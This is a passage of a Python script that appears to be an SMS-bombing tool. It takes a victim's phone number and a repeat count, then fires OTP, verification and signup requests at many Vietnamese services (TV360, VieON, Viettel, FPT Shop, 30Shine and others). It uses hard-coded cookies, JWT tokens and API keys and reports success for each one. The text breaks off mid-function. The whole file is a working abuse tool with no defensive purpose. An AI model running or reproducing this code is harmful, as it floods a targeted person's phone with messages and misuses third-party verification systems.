# -*- coding: utf-8 -*-
import requests
import time
import sys
import urllib3
from colorama import Fore, Style, init
import random
import json
import string
import concurrent.futures
def generate_random_email(domain='example.com'):
    length = random.randint(5, 10)
    email_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    
    email = f'{email_name}@{domain}'
    return email

random_email = generate_random_email()
init(autoreset=True)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

http = urllib3.PoolManager(
    cert_reqs='CERT_REQUIRED',
    ca_certs='/path/to/your/certificate-authority-bundle-file'
)

if len(sys.argv) != 3:
    print("Số lượng tham số không đúng")
    sys.exit()

sdt = sys.argv[1]
count = sys.argv[2]

print("Số điện thoại:", sdt)
print("Số lần lặp:", count)

count = int(count)

if count > 900:
    count = 99999999

def sdtt(sdt):
    if sdt.startswith("0"):
        return "+84" + sdt[1:]
    return sdt

sdt_chuyen_doi = sdtt(sdt)

def tv360():
    cookies = {
        'img-ext': 'avif',
        'NEXT_LOCALE': 'vi',
        'device-id': 's%3Aweb_d113a986-bdb0-45cd-9638-827d1a7809bb.vUWWw%2BnJUtWclZZ4EpwoSqqe8Z3%2BOEyIWvptoDuLrDk',
        'shared-device-id': 'web_d113a986-bdb0-45cd-9638-827d1a7809bb',
        'screen-size': 's%3A1920x1080.uvjE9gczJ2ZmC0QdUMXaK%2BHUczLAtNpMQ1h3t%2Fq6m3Q',
        'access-token': '',
        'refresh-token': '',
        'msisdn': '',
        'profile': '',
        'user-id': '',
        'session-id': 's%3Aaba282a7-d30b-4fa2-b4dd-8b1217b1a008.Jg2CyIIRl98IEt0yW76P%2BPy0G79GQOHxw6rA6PTq9BM',
        'G_ENABLED_IDPS': 'google',
    }

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        # 'cookie': 'img-ext=avif; NEXT_LOCALE=vi; device-id=s%3Aweb_d113a986-bdb0-45cd-9638-827d1a7809bb.vUWWw%2BnJUtWclZZ4EpwoSqqe8Z3%2BOEyIWvptoDuLrDk; shared-device-id=web_d113a986-bdb0-45cd-9638-827d1a7809bb; screen-size=s%3A1920x1080.uvjE9gczJ2ZmC0QdUMXaK%2BHUczLAtNpMQ1h3t%2Fq6m3Q; access-token=; refresh-token=; msisdn=; profile=; user-id=; session-id=s%3Aaba282a7-d30b-4fa2-b4dd-8b1217b1a008.Jg2CyIIRl98IEt0yW76P%2BPy0G79GQOHxw6rA6PTq9BM; G_ENABLED_IDPS=google',
        'origin': 'https://tv360.vn',
        'priority': 'u=1, i',
        'referer': 'https://tv360.vn/login?r=https%3A%2F%2Ftv360.vn%2F',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'starttime': '1721479947788',
        'tz': 'Asia/Bangkok',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'msisdn': sdt,
    }

    try:
        response = requests.post('https://tv360.vn/public/v1/auth/get-otp-login', cookies=cookies, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("TV360 | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("TV360 | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
    
def beautybox():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'key': '79d2b3f19c99f5f7fe5971dd8a8da10d',
        'origin': 'https://beautybox.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://beautybox.com.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'timestamp': '1721481506061',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phoneNumber': sdt,
    }

    try:
        response = requests.post(
            'https://beautybox-api.hsv-tech.io/client/phone-verification/request-verification',
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("BEAUTYBOX | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("BEAUTYBOX | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def galaxyplay():
    headers = {
        'accept': '*/*',
        'accept-language': 'vi',
        'access-token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiI2YzY0MTgxMi00OTk0LTQyN2EtOWU2Zi0zZjdkYjE4NDE3M2YiLCJkaWQiOiI5MjlmYWM4Zi1kMzIwLTQ4NGEtYjBlMi0zNzM3ZGFiYzc0MzAiLCJpcCI6IjE3MS4yMjQuMTc3LjI0OSIsIm1pZCI6Ik5vbmUiLCJwbHQiOiJ3ZWJ8bW9iaWxlfHdpbmRvd3N8MTB8b3BlcmEiLCJhcHBfdmVyc2lvbiI6IjIuMC4wIiwiaWF0IjoxNzIxNDg5MzMxLCJleHAiOjE3MzcwNDEzMzF9.BO2W7U4Y9QBrqv_Vhr34OlQ003dseXM5sOYsJPl1DK4',
        # 'content-length': '0',
        'origin': 'https://galaxyplay.vn',
        'priority': 'u=1, i',
        'referer': 'https://galaxyplay.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'phone': sdt,
    }

    try:
        response = requests.post('https://api.glxplay.io/account/phone/verify', params=params, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GALAXYPLAY | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GALAXYPLAY | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vieon():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjE2OTc2NzcsImp0aSI6IjM2YTYxOGU4ZmNlMzlmNzVkZjJhZDk1Mjg5YWE3OTk5IiwiYXVkIjoiIiwiaWF0IjoxNzIxNTI0ODc3LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTcyMTUyNDg3Niwic3ViIjoiYW5vbnltb3VzXzI1MjhiYWQ3MWJiYmY5ODg4ODJhYTcyZmRiMTA1Mzg0LWNlM2FjYzc2ODdlNmVjNWRhZGJiN2E1N2YzMWE0YTBkLTE3MjE1MjQ4NzciLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiMjUyOGJhZDcxYmJiZjk4ODg4MmFhNzJmZGIxMDUzODQtY2UzYWNjNzY4N2U2ZWM1ZGFkYmI3YTU3ZjMxYTRhMGQtMTcyMTUyNDg3NyIsInVhIjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyNi4wLjAuMCBTYWZhcmkvNTM3LjM2IE9QUi8xMTIuMC4wLjAiLCJkdCI6IndlYiIsIm10aCI6ImFub255bW91c19sb2dpbiIsIm1kIjoiV2luZG93cyAxMCIsImlzcHJlIjowLCJ2ZXJzaW9uIjoiIn0.wXtslFrAOKsPxT41wnkXvzY7K1AocvJykB4eI0jnesY',
        'content-type': 'application/json',
        'origin': 'https://vieon.vn',
        'priority': 'u=1, i',
        'referer': 'https://vieon.vn/auth/?destination=/&page=/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    params = {
        'platform': 'web',
        'ui': '012021',
    }

    json_data = {
        'username': sdt,
        'country_code': 'VN',
        'model': 'Windows 10',
        'device_id': '2528bad71bbbf988882aa72fdb105384',
        'device_name': 'Opera/112',
        'device_type': 'desktop',
        'platform': 'web',
        'ui': '012021',
    }

    try:
        response = requests.post('https://api.vieon.vn/backend/user/v2/register', params=params, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VIEON | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VIEON | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def thefaceshop():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'key': 'cf709515be3685bb734f1c6bcb30bffc',
        'origin': 'https://thefaceshop.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://thefaceshop.com.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'timestamp': '1721530092656',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phoneNumber': sdt,
    }

    try:
        response = requests.post(
            'https://tfs-api.hsv-tech.io/client/phone-verification/request-verification',
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("THEFACESHOP | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("THEFACESHOP | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def bestexpress():
    headers = {
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Origin': 'https://best-inc.vn',
        'Referer': 'https://best-inc.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'accept': 'application/json',
        'authorization': 'null',
        'content-type': 'application/json',
        'lang-type': 'vi-VN',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'x-auth-type': 'WEB',
        'x-lan': 'VI',
        'x-nat': 'vi-VN',
        'x-timezone-offset': '7',
    }

    params = {
        'code': 'fc9da32a48e6298d54a7a81dbbbcff50',
        'instanceId': '4fc17ac7-654b-406a-847b-efc9b7171ffa',
        'validate': '921c7b9ec5502202ec88625cb96b913e',
    }

    json_data = {
        'phoneNumber': sdt,
        'verificationCodeType': 1,
    }

    try:
        response = requests.post('https://v9-cc.800best.com/uc/account/sendSignUpCode', params=params, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("BESTEXPRESS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("BESTEXPRESS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def myviettel():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        # 'content-length': '0',
        'origin': 'https://vietteltelecom.vn',
        'priority': 'u=1, i',
        'referer': 'https://vietteltelecom.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
    }

    try:
        response = requests.post(
            f'https://apigami.viettel.vn/mvt-api/myviettel.php/getOTPLoginCommon?lang=vi&phone={sdt}&actionCode=myviettel:%2F%2Flogin_mobile&typeCode=DI_DONG&type=otp_login',
            headers=headers,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MYVIETTEL | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MYVIETTEL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def fptshop():
    headers = {
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'apptenantid': 'E6770008-4AEA-4EE6-AEDE-691FD22F5C14',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'Content-Type': 'application/json',
        'Referer': 'https://fptshop.com.vn/',
        'order-channel': '1',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'fromSys': 'WEBKHICT',
        'otpType': '0',
        'phoneNumber': sdt,
    }

    try:
        response = requests.post('https://papi.fptshop.com.vn/gw/is/user/new-send-verification', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FPTSHOP | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("FPTSHOP | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def sapo():
    cookies = {
        'source': 'https://www.sapo.vn/',
        'G_ENABLED_IDPS': 'google',
        'lang': 'vi',
        'landing_page': 'https://www.sapo.vn/',
        'start_time': '10/27/2024 15:28:23',
        'pageview': '1',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        # 'cookie': 'source=https://www.sapo.vn/; G_ENABLED_IDPS=google; lang=vi; landing_page=https://www.sapo.vn/; start_time=10/27/2024 15:28:23; pageview=1',
        'origin': 'https://www.sapo.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.sapo.vn/',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
    }

    json_data = {
        'FullName': 'datg',
        'StoreName': 'fassfa2',
        'PhoneNumber': sdt,
        'City': 'Hà Nội',
        'PackageTitle': 'sapo_go_v3',
        'ConfirmPolicy': True,
        'Preferred': '',
        'SaleName': '',
        'Reference': '',
        'Source': 'https://www.sapo.vn/',
        'Referral': '',
        'Campaign': '',
        'LandingPage': 'https://www.sapo.vn/',
        'StartTime': '10/27/2024 15:28:23',
        'EndTime': '10/27/2024 15:28:24',
        'PageView': '1',
        'AffId': '',
        'AffTrackingId': '',
        'SalesTeam': '',
        'SocialSource': '',
        'FacebookName': '',
        'FacebookAvatar': '',
    }

    try:
        response = requests.post('https://www.sapo.vn/consultingrequest/registertrial', cookies=cookies, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("SAPO | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("SAPO | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def reebok():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'key': '0134f9fc8e5bb3de6352617eacc195a2',
        'origin': 'https://reebok.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://reebok.com.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'timestamp': '1721548395723',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phoneNumber': sdt,
    }

    try:
        response = requests.post(
            'https://reebok-api.hsv-tech.io/client/phone-verification/request-verification',
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("REEBOK | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("REEBOK | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def shine():
    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': '',
        'content-type': 'application/json',
        'origin': 'https://30shine.com',
        'priority': 'u=1, i',
        'referer': 'https://30shine.com/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phone': sdt,
    }

    try:
        response = requests.post(
            'https://ls6trhs5kh.execute-api.ap-southeast-1.amazonaws.com/Prod/otp/send',
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("30SHINE | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("30SHINE | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def oreka():
    cookies = {
        'SRVID_DK': '24b4b6254ab3a137',
        '__ork_u': '',
        '__ork_u_idt': '',
        '__ork_u_ph': '',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'apollo-require-preflight': 'true',
        'authorization': '',
        'content-type': 'application/json',
        # 'cookie': 'SRVID_DK=24b4b6254ab3a137; __ork_u=; __ork_u_idt=; __ork_u_ph=',
        'origin': 'https://www.oreka.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.oreka.vn/login',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'x-by-platform': 'PC_WEB',
    }

    json_data = {
        'variables': {
            'phone': sdt,
            'locale': 'vi',
        },
        'query': 'mutation ($phone: String!, $locale: String!) {\n  sendVerifyPhoneApp(phone: $phone, locale: $locale)\n}',
    }

    try:
        response = requests.post('https://www.oreka.vn/graphql', cookies=cookies, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("OREKA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("OREKA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def acfc():
    cookies = {
        'form_key': 'NAeTVepv8jfDGFEt',
        'mage-cache-storage': '{}',
        'mage-cache-storage-section-invalidation': '{}',
        'recently_viewed_product': '{}',
        'recently_viewed_product_previous': '{}',
        'recently_compared_product': '{}',
        'recently_compared_product_previous': '{}',
        'product_data_storage': '{}',
        'mage-messages': '',
        'optiMonkClientId': '031e2e37-cd11-5d7f-bdd8-87671934b9a6',
        'optiMonkSession': '1721551346',
        'PHPSESSID': 'km715lglu45ngr7e6ubngf6f1a',
        'form_key': 'NAeTVepv8jfDGFEt',
        'private_content_version': 'd62e46921486bf21498614890d7e6251',
        'mgn_location_popup': 'southern',
        'X-Magento-Vary': '1dedfea16bd448ed11649def077bf655f8a6a95b3f3e1f559074febbe59693fc',
        'mage-cache-sessid': 'true',
        'aws-waf-token': '9ebe372d-9bac-4629-89bf-6c56fe46a184:BgoAlfE7etEyAgAA:Ov9qItJghL7JQES9NLNAtRsyuwLwfsrDWAWFXrzsZxChcKixFyRmyEVRlWBD9hO05D/g9IY+VVeV/lGsgZjEbVvzkuHAUQ9JNL/Yk16tCF1cAiLOQsoz5da1YgVsfqd/Rifxg/HRrA/PeiSv9022XH5JQN92MwBlN2/Zlwea9A+n7vBiarulYu5vWdtUpl4Que2B5ZhkfeN6sJH26VrQWJagIzZLzBq4bBfpu8KWmRMEmhYN9wEKAQ==',
        'optiMonkClient': 'N4IgjArAnGAcUgFygMYEMnAL4BoQDMA3JMAdgCZIIwBmAFgjwBtjEzKJqaJY8A7APYAHVjSxYgA=',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'form_key=NAeTVepv8jfDGFEt; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-messages=; optiMonkClientId=031e2e37-cd11-5d7f-bdd8-87671934b9a6; optiMonkSession=1721551346; PHPSESSID=km715lglu45ngr7e6ubngf6f1a; form_key=NAeTVepv8jfDGFEt; private_content_version=d62e46921486bf21498614890d7e6251; mgn_location_popup=southern; X-Magento-Vary=1dedfea16bd448ed11649def077bf655f8a6a95b3f3e1f559074febbe59693fc; mage-cache-sessid=true; aws-waf-token=9ebe372d-9bac-4629-89bf-6c56fe46a184:BgoAlfE7etEyAgAA:Ov9qItJghL7JQES9NLNAtRsyuwLwfsrDWAWFXrzsZxChcKixFyRmyEVRlWBD9hO05D/g9IY+VVeV/lGsgZjEbVvzkuHAUQ9JNL/Yk16tCF1cAiLOQsoz5da1YgVsfqd/Rifxg/HRrA/PeiSv9022XH5JQN92MwBlN2/Zlwea9A+n7vBiarulYu5vWdtUpl4Que2B5ZhkfeN6sJH26VrQWJagIzZLzBq4bBfpu8KWmRMEmhYN9wEKAQ==; optiMonkClient=N4IgjArAnGAcUgFygMYEMnAL4BoQDMA3JMAdgCZIIwBmAFgjwBtjEzKJqaJY8A7APYAHVjSxYgA=',
        'origin': 'https://www.acfc.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.acfc.com.vn/customer/account/create/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'number_phone': sdt,
        'form_key': 'NAeTVepv8jfDGFEt',
        'currentUrl': 'https://www.acfc.com.vn/customer/account/create/',
    }

    try:
        response = requests.post('https://www.acfc.com.vn/mgn_customer/customer/sendOTP', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("ACFC | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("ACFC | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def pantio():
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://pantio.vn',
        'priority': 'u=1, i',
        'referer': 'https://pantio.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    params = {
        'domain': 'pantiofashion.myharavan.com',
    }

    data = {
        'phoneNumber': sdt,
    }

    try:
        response = requests.post('https://api.suplo.vn/v1/auth/customer/otp/sms/generate', params=params, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("PANTIO | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("PANTIO | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def pantioresend():
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://pantio.vn',
        'priority': 'u=1, i',
        'referer': 'https://pantio.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    params = {
        'domain': 'pantiofashion.myharavan.com',
    }

    data = {
        'phoneNumber': sdt,
    }

    try:
        response = requests.post('https://api.suplo.vn/v1/auth/customer/otp/sms/resend', params=params, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("PANTIORESEND | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("PANTIORESEND | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def winny():
    cookies = {
        'PHPSESSID': '1ead98730f607548ac0c2f370f8c2dbe',
        'X-Magento-Vary': '3ea997b53ecbf5fe274e7bf3c497ad101c488a4c',
        'form_key': 'p2sTfiaO8ihlRup7',
        'mage-cache-storage': '%7B%7D',
        'mage-cache-storage-section-invalidation': '%7B%7D',
        'form_key': 'p2sTfiaO8ihlRup7',
        'mage-cache-sessid': 'true',
        'recently_viewed_product': '%7B%7D',
        'recently_viewed_product_previous': '%7B%7D',
        'recently_compared_product': '%7B%7D',
        'recently_compared_product_previous': '%7B%7D',
        'product_data_storage': '%7B%7D',
        'mage-messages': '',
        'private_content_version': '87379c6193f6b8c7933f3a0f50cec8ef',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'PHPSESSID=1ead98730f607548ac0c2f370f8c2dbe; X-Magento-Vary=3ea997b53ecbf5fe274e7bf3c497ad101c488a4c; form_key=p2sTfiaO8ihlRup7; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; form_key=p2sTfiaO8ihlRup7; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; mage-messages=; private_content_version=87379c6193f6b8c7933f3a0f50cec8ef',
        'origin': 'https://winny.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://winny.com.vn/customer/account/create/',
